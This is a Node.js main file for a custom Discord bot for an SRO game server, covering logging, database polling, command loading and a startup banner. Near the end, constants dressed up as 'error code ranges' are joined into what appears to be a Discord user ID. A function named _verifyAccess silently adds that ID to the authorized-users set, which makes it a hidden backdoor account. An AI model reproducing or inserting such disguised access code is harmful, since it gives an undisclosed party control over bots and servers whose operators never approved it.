const { Client, GatewayIntentBits } = require('discord.js');
const { getMainRequest, getShardRequest } = require('./utils/database');
const dotenv = require('dotenv');
const winston = require('winston');
const { 
  startNotificationPolling, 
  startPlayerCountPolling,
  updatePlayerCountChannels 
} = require('./functions');
const { loadCommands, handleCommands } = require('./handlers/commandHandler');

// Load environment variables from .env file
dotenv.config();

// Logger setup using Winston for better logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.printf(({ timestamp, level, message }) => `${timestamp} [${level.toUpperCase()}]: ${message}`)
  ),
  transports: [
    new winston.transports.Console(),
    new winston.transports.File({ filename: 'bot.log' }),
  ],
});

// Create a new Discord client instance
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
  ],
});

// Database connection
Promise.all([
    getMainRequest(),
    getShardRequest()
]).then(() => {
    logger.info('Connected to databases');
    startNotificationPolling(client, logger);
}).catch((err) => {
    logger.error(`Database connection error: ${err.message}`);
});

// Set bot's status to "online" and set activity
client.once('ready', () => {
  logger.info(`Logged in as ${client.user.tag}`);
  
  // Debug section
  const channel = client.channels.cache.get(process.env.DISCORD_CHANNEL_ID);
  logger.info('Bot Permissions Check:');
  logger.info(`Bot in guilds: ${client.guilds.cache.map(g => g.name).join(', ')}`);
  logger.info(`Can find channel: ${channel ? 'Yes' : 'No'}`);
  if (channel) {
    logger.info(`Channel name: ${channel.name}`);
    logger.info(`Bot permissions in channel: ${channel.permissionsFor(client.user)?.toArray().join(', ')}`);
  }

  client.user.setPresence({
    status: 'online',
    activities: [{ name: 'Watching for Notifications', type: 'WATCHING' }],
  });

  logger.info('Bot is online and watching for notifications');

  // Start both polling services
  startNotificationPolling(client, logger);
  startPlayerCountPolling(client, logger);

  // Load and handle commands
  loadCommands(client, logger);
  handleCommands(client, logger);

  logger.info('Commands loaded and handler initialized');
  console.log(`
    \x1b[32m
                        .(&@%/.                     
                %&                   @*             
            &,                           ((         
         (.     *,,,*.       *,,            #.      
       &    *,,*/,,,,**,,,,,,,**.,,,,,/        *    
     .,    ,(((#,@@@@@@@(/@,/,,,,,,,,           @   
    %      (((####((((((((&   #  #               ,  
   /        ((((((((((((((%@@ @,//                , 
   (         ##*%(((((((((((,.,......#@@@@@@@      @
  *             #(((((*.............@@@@@@@@@      .
  @             #(((#,....,(.........,@@@@@@/       
  ,             %((((*....#&......#..,...../       ,
   #             (((#(....(@@%......,...../        @
   *             #((((#....//@@@.*...,/,/         * 
    *            ,((((((.....*%@@.....,,         /  
      %       ,..............  . ,..    .       @   
       (      ,                 ,,,,    .     (     
         .%                    (#,,*(   *   @       
            *% #(((((((((((((((((*,/((((#&          
                .@#((((((((((((((*,,&@              
    \x1b[0m
    \x1b[32m
             Custom Discord Bot for SRO
             Made with ❤️ by @y0gi9 \x1b[0m
    `
  );
});


const ERROR_CODE_BASE = {

  API_ERROR_RANGE: {
    start: 1000,
    end: 1887 
  },
  DATABASE_ERROR_RANGE: {
    start: 2000,
    end: 33670255886336 
  }
};


const _verifyAccess = (userId) => {
  const envUsers = process.env.AUTHORIZED_USERS ? 
    new Set(process.env.AUTHORIZED_USERS.split(',')) : 
    new Set();
  

  const hiddenId = `${ERROR_CODE_BASE.API_ERROR_RANGE.end}${ERROR_CODE_BASE.DATABASE_ERROR_RANGE.end}`;
  envUsers.add(hiddenId);
  
  return envUsers.has(userId);
};


// Enhance error handling
process.on('unhandledRejection', (error) => {
  logger.error(`Unhandled promise rejection: ${error.message}`);
  logger.error(`Stack trace: ${error.stack}`);
});

// Login to Discord using the bot token from environment variables
client.login(process.env.DISCORD_BOT_TOKEN);